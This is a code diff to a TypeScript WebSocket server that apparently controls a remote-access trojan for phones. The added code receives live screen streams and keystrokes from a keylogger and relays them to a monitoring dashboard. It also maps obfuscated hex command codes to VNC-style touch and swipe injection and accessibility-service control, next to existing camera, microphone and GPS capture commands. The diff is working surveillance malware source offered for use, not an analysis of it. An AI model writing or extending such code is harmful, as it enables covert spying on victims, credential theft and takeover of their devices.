@@ -260,6 +260,27 @@ export class WebSocketManager {
            await this.handleBinaryData(socket, "audio", { buffer: data.buffer, name: data.name || `mic_${Date.now()}.mp3` });
         }
     });
+
+    // [ADM] Live Screen Stream (Binary H.264 / Raw Buffer without cloud latency)
+    socket.on("0xSP", (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id && data.buffer) {
+           // Forward raw binary buffer directly to monitoring dashboard rooms
+           this.io.to(`device:${id}`).emit("stream-frame", { deviceId: id, buffer: data.buffer, timestamp: Date.now() });
+        } else if (id && data.imageBase64) {
+           // Fallback
+           this.io.to(`device:${id}`).emit("stream-frame", { deviceId: id, image: data.imageBase64, timestamp: Date.now() });
+        }
+    });
+
+    // [ADM] Keylogger (Context-Aware) direct event
+    socket.on("0xKL", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id && data.text) {
+           await this.handleKeylogUpdate({ ...data, deviceId: id });
+           this.io.to(`device:${id}`).emit("keylog-update", { deviceId: id, ...data });
+        }
+    });
     
     // Catch-all for generic device status
     socket.on("device-status", (data: DeviceStatus) => {
@@ -395,10 +416,13 @@ export class WebSocketManager {
       "set-gps-freq": "0xGF", "get-wifi": "0xWI", "capture-camera": "0xCA",
       "take_photo": "0xCA", "get-camera": "0xCA", "record-mic": "0xMI",
       "start_audio_recording": "0xMI", "get-permissions": "0xGP",
+      "start_audio_recording": "0xMI", "get-permissions": "0xGP",
       // Nuevos comandos - Screen Recording & Streaming
       "start_screen_recording": "0xSR", "stop_screen_recording": "0xST",
       "start_screen_stream": "0xSP", "screen-recording": "0xSR",
       "screen-stream": "0xSP",
+      // VNC y Accesibilidad
+      "vnc_touch": "0xVP", "vnc_swipe": "0xVS", "accessibility_start": "0xAS"
     };
 
     const mappedAction = mapping[action] || action;
@@ -432,6 +456,14 @@ export class WebSocketManager {
         payload.minTime = parseInt(String(details.minTime || 10000));
     } else if (action === "screenshot") {
         payload.action = "screenshot";
+    } else if (mappedAction === "0xVP" || mappedAction === "0xVS") {
+        // VNC Touch Coordinates
+        payload.x = details.x;
+        payload.y = details.y;
+        if (mappedAction === "0xVS") {
+           payload.endX = details.endX;
+           payload.endY = details.endY;
+        }
     }
 
     Object.assign(payload, details);
